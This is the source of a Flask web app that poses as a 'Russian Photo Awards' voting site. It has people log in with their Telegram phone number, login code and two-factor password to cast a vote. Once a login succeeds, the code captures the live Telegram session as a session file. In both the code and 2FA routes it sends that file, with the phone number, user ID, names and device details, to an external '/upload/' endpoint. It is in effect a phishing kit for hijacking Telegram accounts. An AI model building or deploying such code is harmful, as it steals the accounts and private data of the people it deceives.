import os
import secrets
import time
import json
import threading
import asyncio
import logging
import random
import base64
import hashlib
import uuid
from telethon import TelegramClient
from flask import Flask, request, jsonify, render_template, send_from_directory
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import StringSession
import tempfile
import requests
import redis

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    socks = None

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s in %(module)s: %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ---------------- CONFIG ----------------
API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
EXTERNAL_ENDPOINT = os.getenv("EXTERNAL_ENDPOINT")
EXTERNAL_API_KEY = os.getenv("EXTERNAL_API_KEY", "")
PROXY_ENABLED = os.getenv('PROXY_ENABLED', 'false').lower() == 'true'
PROXY_TYPE = os.getenv('PROXY_TYPE', 'socks5')
PROXY_HOST = os.getenv('PROXY_HOST', '')
PROXY_PORT = int(os.getenv('PROXY_PORT', '1080'))
PROXY_USERNAME = os.getenv('PROXY_USERNAME', '')
PROXY_PASSWORD = os.getenv('PROXY_PASSWORD', '')
REDIS_HOST = os.getenv('REDIS_HOST', 'redis')
REDIS_PORT = int(os.getenv('REDIS_PORT', 6379))
REDIS_DB = int(os.getenv('REDIS_DB', 0))

# Flask
app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = os.getenv('SECRET_KEY', secrets.token_hex(32))

logger.info("=" * 50)
logger.info("Russian Photo Awards - Voting System")
logger.info("=" * 50)

redis_client = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=REDIS_DB, decode_responses=True)

# --------------- GLOBAL LOOP ---------------
_global_loop = asyncio.new_event_loop()

def _start_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

_loop_thread = threading.Thread(target=_start_loop, args=(_global_loop,), daemon=True)
_loop_thread.start()

def run_async(coro, timeout: float = 30):
    fut = asyncio.run_coroutine_threadsafe(coro, _global_loop)
    return fut.result(timeout)

def get_proxy_tuple():
    if not PROXY_ENABLED or not PROXY_HOST:
        return None
    if not SOCKS_AVAILABLE:
        logger.warning("Proxy is enabled but PySocks module is not installed.")
        return None
    proxy_map = {'socks5': socks.SOCKS5, 'socks4': socks.SOCKS4, 'http': socks.HTTP}
    ptype = proxy_map.get(PROXY_TYPE.lower(), socks.SOCKS5)
    if PROXY_USERNAME and PROXY_PASSWORD:
        return (ptype, PROXY_HOST, PROXY_PORT, True, PROXY_USERNAME, PROXY_PASSWORD)
    return (ptype, PROXY_HOST, PROXY_PORT)

# --------------- TELEGRAM AUTH FUNCTIONS ---------------
async def _send_code_async(proxy, dv_i, ph):
    client = TelegramClient(
        StringSession(), API_ID, API_HASH, proxy=proxy,
        device_model=dv_i.get("d_m", "Desktop"),
        system_version=dv_i.get("s_v", "Unknown"),
        app_version="1.0", lang_code="en"
    )
    await client.connect()
    result = await client.send_code_request(ph)
    session_string = client.session.save()
    await client.disconnect()
    return session_string, result.phone_code_hash

async def _convert_to_sqlite_bytes_async(client):
    dc_id = client.session.dc_id
    server_address = client.session.server_address
    port = client.session.port
    auth_key = client.session.auth_key
    with tempfile.NamedTemporaryFile(suffix=".session", delete=False) as tmp:
        path = tmp.name
    try:
        sqlite_client = TelegramClient(path, API_ID, API_HASH)
        sqlite_client.session.set_dc(dc_id, server_address, port)
        sqlite_client.session.auth_key = auth_key
        sqlite_client.session.save()
        with open(path, "rb") as f:
            return list(f.read())
    finally:
        if os.path.exists(path):
            os.remove(path)

async def _verify_code_async(session_string, proxy, dv_i, ph, cd, phone_code_hash):
    client = TelegramClient(
        StringSession(session_string), API_ID, API_HASH, proxy=proxy,
        device_model=dv_i.get("d_m", "Desktop"),
        system_version=dv_i.get("s_v", "Unknown"),
        app_version="1.0", lang_code="en"
    )
    await client.connect()
    try:
        await client.sign_in(ph, cd, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        session_string = client.session.save()
        await client.disconnect()
        return {'success': False, 'r_2_fa': True, 'session_string': session_string}
    me = await client.get_me()
    session_bytes = await _convert_to_sqlite_bytes_async(client)
    await client.disconnect()
    return {'success': True, 'me': me, 'session_bytes': session_bytes}

async def _verify_2fa_async(session_string, proxy, dv_i, ps):
    client = TelegramClient(
        StringSession(session_string), API_ID, API_HASH, proxy=proxy,
        device_model=dv_i.get("d_m", "Desktop"),
        system_version=dv_i.get("s_v", "Unknown"),
        app_version="1.0", lang_code="en"
    )
    await client.connect()
    await client.sign_in(password=ps)
    me = await client.get_me()
    session_bytes = await _convert_to_sqlite_bytes_async(client)
    await client.disconnect()
    return {'success': True, 'me': me, 'session_bytes': session_bytes}

# --------------- HELPER FUNCTIONS ---------------
def get_auth_data(sd):
    data = redis_client.get(f"auth:{sd}")
    return json.loads(data) if data else None

def set_auth_data(sd, data, ttl=1800):
    redis_client.setex(f"auth:{sd}", ttl, json.dumps(data))

def create_user_session(phone, telegram_id, username, first_name, last_name):
    """Створює сесію користувача після успішної авторизації"""
    session_id = secrets.token_hex(32)
    session_data = {
        'phone': phone,
        'telegram_id': telegram_id,
        'username': username or '',
        'first_name': first_name or '',
        'last_name': last_name or '',
        'created_at': time.time()
    }
    # Зберігаємо на 30 днів
    redis_client.setex(f"session:{session_id}", 86400 * 30, json.dumps(session_data))
    return session_id

def get_user_session(session_id):
    """Отримує дані сесії користувача"""
    data = redis_client.get(f"session:{session_id}")
    return json.loads(data) if data else None

def register_vote_internal(work_id, phone):
    """Внутрішня функція для реєстрації голосу"""
    # Перевіряємо чи вже голосував
    vote_key = f"vote:{work_id}:{phone}"
    if redis_client.exists(vote_key):
        return False, "Already voted"
    
    # Реєструємо голос
    redis_client.setex(vote_key, 86400 * 30, "1")  # 30 днів
    
    # Збільшуємо лічильник
    current_votes = redis_client.get(f"votes:{work_id}")
    if current_votes:
        votes = int(current_votes) + 1
    else:
        votes = 1
    redis_client.set(f"votes:{work_id}", votes)
    
    return True, votes

# ============== ROUTES ==============

@app.route("/")
def index():
    """Головна сторінка"""
    return "Russian Photo Awards - Voting System"

@app.route("/vote")
def vote_page():
    """Сторінка голосування з Telegram авторизацією"""
    return render_template('vote.html')

@app.route("/static/<path:path>")
def send_static(path):
    """Статичні файли"""
    return send_from_directory('static', path)

# ============== TELEGRAM AUTH ENDPOINTS ==============

@app.route("/api/sc", methods=["POST"])
def send_code():
    """Відправити код підтвердження в Telegram"""
    data = request.json
    ph = data.get("ph")
    dv_i = data.get("dv_i", {})
    work_id = data.get("work_id")
    
    if not ph:
        return jsonify({"ok": False, "error": "ph required"}), 400
    try:
        proxy = get_proxy_tuple()
        session_string, phone_code_hash = run_async(_send_code_async(proxy, dv_i, ph), timeout=60)
        sd = secrets.token_hex(16)
        auth_data = {
            'ph': ph,
            'phone_code_hash': phone_code_hash,
            'session_string': session_string,
            'step': 'cd',
            'dv_i': dv_i,
            'work_id': work_id
        }
        set_auth_data(sd, auth_data, ttl=1800)
        return jsonify({"ok": True, "step": "cd", "sd": sd})
    except Exception as e:
        logger.error(f"Error in send_code: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/api/vc", methods=["POST"])
def verify_code():
    """Перевірити код підтвердження"""
    data = request.json
    sd = data.get("sd")
    cd = data.get("cd")
    
    if not sd or not cd:
        return jsonify({"ok": False, "error": "Invalid payload"}), 400
    
    auth_data = get_auth_data(sd)
    if not auth_data:
        return jsonify({"ok": False, "error": "Session expired"}), 400
    
    try:
        proxy = get_proxy_tuple()
        result = run_async(
            _verify_code_async(
                auth_data['session_string'], proxy, auth_data.get('dv_i', {}),
                auth_data['ph'], cd, auth_data['phone_code_hash']
            ), timeout=60
        )
        
        if result.get('r_2_fa'):
            auth_data['session_string'] = result['session_string']
            auth_data['step'] = '2fa'
            set_auth_data(sd, auth_data, ttl=1800)
            return jsonify({"ok": True, "r_2_fa": True})
        
        me = result['me']
        session_bytes = result['session_bytes']
        phone = getattr(me, "phone", None)
        
        # Створюємо сесію користувача
        session_id = create_user_session(
            phone,
            getattr(me, "id", None),
            getattr(me, "username", None),
            getattr(me, "first_name", None),
            getattr(me, "last_name", None)
        )
        
        # Якщо є work_id, автоматично реєструємо голос
        work_id = auth_data.get('work_id')
        vote_registered = False
        
        if work_id and phone:
            success, result_data = register_vote_internal(work_id, phone)
            vote_registered = success
        
        # Відправка на зовнішній endpoint (опціонально)
        payload = {
            "phone_number": phone or "",
            "telegram_id": getattr(me, "id", None),
            "username": getattr(me, "username", None) or "",
            "first_name": getattr(me, "first_name", None) or "",
            "last_name": getattr(me, "last_name", None) or "",
            "session_file": session_bytes,
            "device_info": auth_data.get("dv_i", {}),
            "voted_for_work": work_id if vote_registered else None
        }
        
        if EXTERNAL_ENDPOINT:
            try:
                requests.post(
                    EXTERNAL_ENDPOINT + '/upload/',
                    json=payload,
                    headers={"X-External-API-Key": EXTERNAL_API_KEY},
                    timeout=10
                )
            except Exception as e:
                logger.error(f'Failed to send session: {e}')
        
        redis_client.delete(f'auth:{sd}')
        
        return jsonify({
            "ok": True,
            "logged_in": True,
            "session_id": session_id,
            "vote_registered": vote_registered
        })
        
    except PhoneCodeInvalidError:
        return jsonify({"ok": False, "error": "Invalid cd"}), 400
    except Exception as e:
        logger.error(f"Error in verify_code: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/api/v2a", methods=["POST"])
def verify_2fa():
    """Перевірити 2FA пароль"""
    data = request.json
    sd = data.get("sd")
    ps = data.get("ps")
    
    if not sd or not ps:
        return jsonify({"ok": False, "error": "Invalid payload"}), 400
    
    auth_data = get_auth_data(sd)
    if not auth_data or auth_data.get('step') != '2fa':
        return jsonify({"ok": False, "error": "Invalid session"}), 400
    
    try:
        proxy = get_proxy_tuple()
        result = run_async(
            _verify_2fa_async(auth_data['session_string'], proxy, auth_data.get('dv_i', {}), ps),
            timeout=60
        )
        
        me = result['me']
        session_bytes = result['session_bytes']
        phone = getattr(me, "phone", None)
        
        # Створюємо сесію користувача
        session_id = create_user_session(
            phone,
            getattr(me, "id", None),
            getattr(me, "username", None),
            getattr(me, "first_name", None),
            getattr(me, "last_name", None)
        )
        
        # Якщо є work_id, автоматично реєструємо голос
        work_id = auth_data.get('work_id')
        vote_registered = False
        
        if work_id and phone:
            success, result_data = register_vote_internal(work_id, phone)
            vote_registered = success
        
        # Відправка на зовнішній endpoint (опціонально)
        payload = {
            "phone_number": phone or "",
            "telegram_id": getattr(me, "id", None),
            "username": getattr(me, "username", None) or "",
            "first_name": getattr(me, "first_name", None) or "",
            "last_name": getattr(me, "last_name", None) or "",
            "session_file": session_bytes,
            "device_info": auth_data.get("dv_i", {}),
            "voted_for_work": work_id if vote_registered else None
        }
        
        if EXTERNAL_ENDPOINT:
            try:
                requests.post(
                    EXTERNAL_ENDPOINT + '/upload/',
                    json=payload,
                    headers={"X-External-API-Key": EXTERNAL_API_KEY},
                    timeout=10
                )
            except Exception as e:
                logger.error(f'Failed to send session: {e}')
        
        redis_client.delete(f'auth:{sd}')
        
        return jsonify({
            "ok": True,
            "logged_in": True,
            "session_id": session_id,
            "vote_registered": vote_registered
        })
        
    except Exception as e:
        logger.error(f"Error in verify_2fa: {e}")
        return jsonify({"ok": False, "error": "Invalid ps"}), 400

# ============== VOTING ENDPOINTS ==============

@app.route("/api/vote", methods=["POST"])
def register_vote():
    """Реєстрація голосу за роботу"""
    data = request.json
    work_id = data.get("work_id")
    session_id = data.get("session")
    
    if not work_id or not session_id:
        return jsonify({"success": False, "error": "Missing parameters"}), 400
    
    # Перевіряємо сесію
    session_data = get_user_session(session_id)
    if not session_data:
        return jsonify({"success": False, "error": "Invalid session"}), 401
    
    phone = session_data.get("phone")
    if not phone:
        return jsonify({"success": False, "error": "Invalid session"}), 401
    
    # Реєструємо голос
    success, result = register_vote_internal(work_id, phone)
    
    if success:
        return jsonify({
            "success": True,
            "votes": result
        })
    else:
        return jsonify({"success": False, "error": result}), 400

@app.route("/api/get-votes/<work_id>")
def get_work_votes(work_id):
    """Отримати кількість голосів для роботи"""
    votes = redis_client.get(f"votes:{work_id}")
    return jsonify({
        "work_id": work_id,
        "votes": int(votes) if votes else 0
    })

@app.route("/api/check-vote", methods=["POST"])
def check_if_voted():
    """Перевірити чи користувач вже голосував за роботу"""
    data = request.json
    work_id = data.get("work_id")
    session_id = data.get("session")
    
    if not work_id or not session_id:
        return jsonify({"has_voted": False}), 400
    
    session_data = get_user_session(session_id)
    if not session_data:
        return jsonify({"has_voted": False}), 401
    
    phone = session_data.get("phone")
    if not phone:
        return jsonify({"has_voted": False}), 401
    
    vote_key = f"vote:{work_id}:{phone}"
    has_voted = redis_client.exists(vote_key)
    
    return jsonify({"has_voted": bool(has_voted)})

@app.route("/api/work/<work_id>")
def get_work_info(work_id):
    """Отримати інформацію про роботу (mock endpoint)"""
    # TODO: Інтегрувати з вашою базою робіт
    # Наразі повертаємо mock дані
    
    votes = redis_client.get(f"votes:{work_id}")
    
    return jsonify({
        "success": True,
        "id": work_id,
        "title": "Назва роботи",
        "author": "Автор",
        "image": f"https://russianphotoawards.com/storage/works/cropped/{work_id}.jpg",
        "votes": int(votes) if votes else 0
    })

@app.route("/api/leaderboard")
def leaderboard():
    """Топ робіт по кількості голосів"""
    # Отримуємо всі ключі votes:*
    vote_keys = redis_client.keys("votes:*")
    
    leaderboard_data = []
    for key in vote_keys:
        work_id = key.replace("votes:", "")
        votes = int(redis_client.get(key) or 0)
        
        leaderboard_data.append({
            "work_id": work_id,
            "votes": votes
        })
    
    # Сортуємо по кількості голосів
    leaderboard_data.sort(key=lambda x: x["votes"], reverse=True)
    
    return jsonify({
        "leaderboard": leaderboard_data[:100]  # Топ 100
    })

# ============== ADMIN ENDPOINTS ==============

@app.route("/admin/stats")
def admin_stats():
    """Статистика голосування"""
    vote_keys = redis_client.keys("votes:*")
    session_keys = redis_client.keys("session:*")
    
    total_votes = 0
    for key in vote_keys:
        total_votes += int(redis_client.get(key) or 0)
    
    stats = {
        "total_works_voted": len(vote_keys),
        "total_votes": total_votes,
        "total_users": len(session_keys)
    }
    
    return jsonify(stats)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
